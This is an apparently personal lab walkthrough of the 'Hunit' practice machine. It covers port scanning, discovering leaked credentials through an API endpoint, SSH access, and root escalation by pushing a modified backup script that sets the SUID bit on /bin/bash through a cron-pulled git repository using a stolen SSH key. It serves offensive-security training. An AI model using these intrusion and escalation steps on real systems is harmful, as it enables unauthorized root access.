---
icon: ubuntu
---

# Hunit - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.225.125 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 18:54 EDT
Nmap scan report for 192.168.225.125
Host is up (0.028s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
8080/tcp  open  http        Apache Tomcat (language: en)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: My Haikus
12445/tcp open  netbios-ssn Samba smbd 4
18030/tcp open  http        Apache httpd 2.4.46 ((Unix))
|_http-title: Whack A Mole!
|_http-server-header: Apache/2.4.46 (Unix)
| http-methods: 
|_  Potentially risky methods: TRACE
43022/tcp open  ssh         OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 7b:fc:37:b4:da:6e:c5:8e:a9:8b:b7:80:f5:cd:09:cb (RSA)
|   256 89:cd:ea:47:25:d9:8f:f8:94:c3:d6:5c:d4:05:ba:d0 (ECDSA)
|_  256 c0:7c:6f:47:7e:94:cc:8b:f8:3d:a0:a6:1f:a9:27:11 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (94%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (95%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (94%), Linux 2.6.32 - 3.13 (91%), Linux 3.2 - 4.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 3.10 - 4.11 (90%), Linux 3.4 - 3.10 (88%), Linux 4.15 (88%), Linux 6.0 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   28.50 ms 192.168.45.1
2   28.52 ms 192.168.45.254
3   28.59 ms 192.168.251.1
4   28.73 ms 192.168.225.125
```

### <mark style="color:$primary;">HTTP Port 8080 TCP</mark>

I am going to run directory busting while I check out the website for anything interesting

```
dirsearch -u http://192.168.225.125:8080/
```

<figure><img src="../../.gitbook/assets/image (1240).png" alt=""><figcaption></figcaption></figure>

Dirsearch reveals an api endpoint! I am going to check it out!

<figure><img src="../../.gitbook/assets/image (1241).png" alt=""><figcaption></figcaption></figure>

The api endpoint reveals a couple of more interesting endpoints. I am going to take a look at the user endpoint, maybe it will reveal some credentials!

<figure><img src="../../.gitbook/assets/image (1242).png" alt=""><figcaption></figcaption></figure>

We got a list of usernames and passwords! I am going to save them to a file and try credential spraying with netexec.

### <mark style="color:$primary;">Credential Spraying</mark>

<figure><img src="../../.gitbook/assets/image (1243).png" alt=""><figcaption></figcaption></figure>

We got ssh access! as **`dademola:ExplainSlowQuest110`**

```
ssh dademola@192.168.225.125 -p 43022
```

<figure><img src="../../.gitbook/assets/image (1244).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption></figcaption></figure>

There is a git-server folder at the / \[root] directory!

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption></figcaption></figure>

It's an actual git directory! I am going to keep this in mind, and run linpeas on the machine and skim over it's output.&#x20;

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (1247).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1248).png" alt=""><figcaption></figcaption></figure>

Linpeas and crontab show us 2 cronjobs running as root. One is from the git-server directory we found earlier!

I am going to run [**pspy64**](https://github.com/DominicBreuker/pspy/releases) as well for a better overview

### <mark style="color:$primary;">Pspy</mark>

<figure><img src="../../.gitbook/assets/image (1252).png" alt=""><figcaption></figcaption></figure>

the cronjobs are running both jobs as root! Pull.sh is basically cloning the git-server!

I am going to clone the git directory and take a look at it:

```
git clone file:///git-server/
```

<figure><img src="../../.gitbook/assets/image (1249).png" alt=""><figcaption></figcaption></figure>

I am going to check the commit's history, and files

<figure><img src="../../.gitbook/assets/image (1250).png" alt=""><figcaption></figcaption></figure>

**`NEW_CHANGE`** was empty, we already know **`backup.sh`** is going to be run by root I'll add a bash reverse payload to it that will add the SUID bit to /bin/bash and wait for root to execute it!

### <mark style="color:$primary;">Cron Jobs \[writable bash script]-> root</mark>

```
echo "chmod +s /bin/bash" >> backups.sh
```

<figure><img src="../../.gitbook/assets/image (1253).png" alt=""><figcaption></figcaption></figure>

I'll add the file to git&#x20;

```
git add backups.sh
```

then commit it to the repo

```
git commit -m "deimos"
```

set the git config

```
git config --global user.name "deimos"
git config --global user.email "deimos"
git commit -m "deimos"
```

and now push to the origin

```
git push -u origin
```

<figure><img src="../../.gitbook/assets/image (1254).png" alt=""><figcaption></figcaption></figure>

And now we realize we do not have permissions :scream:

Ok I found an ssh key for the git user in /home/git/.ssh! Maybe he has permissions, I am going to copy it and try to clone the git repo to my machine!

<figure><img src="../../.gitbook/assets/image (1255).png" alt=""><figcaption></figcaption></figure>

It was tricky to clone the repo as the git user via ssh, here is the command I used:

### <mark style="color:$primary;">Cloning Git Repo to my machine</mark>

```
GIT_SSH_COMMAND='ssh -i git_id_rsa -p 43022 -o IdentitiesOnly=yes' git clone git@192.168.225.125:/git-server/
```

<figure><img src="../../.gitbook/assets/image (1256).png" alt=""><figcaption></figcaption></figure>

ok back at it, I am going to update **`backups.sh`**

<figure><img src="../../.gitbook/assets/image (1258).png" alt=""><figcaption></figcaption></figure>

<mark style="color:red;">**Note!!! Make the script executable, i lost a lot of time not knowing why it was not working !!!**</mark>

Time for the commit and push:

```
git add backups.sh
git commit -m "deimos"
```

<figure><img src="../../.gitbook/assets/image (1259).png" alt=""><figcaption></figcaption></figure>

Now to push the changes to the server:

```
GIT_SSH_COMMAND='ssh -i ../git_id_rsa -p 43022' git push -u origin master
```

<figure><img src="../../.gitbook/assets/image (1260).png" alt=""><figcaption></figcaption></figure>

You might need to wait 3m at most for root to run the script. Here is how many times I checked before the 3m ran out :rofl:

<figure><img src="../../.gitbook/assets/image (1261).png" alt=""><figcaption></figcaption></figure>

And now to get become root!

<figure><img src="../../.gitbook/assets/image (1262).png" alt=""><figcaption></figcaption></figure>

We are root! Let's go!
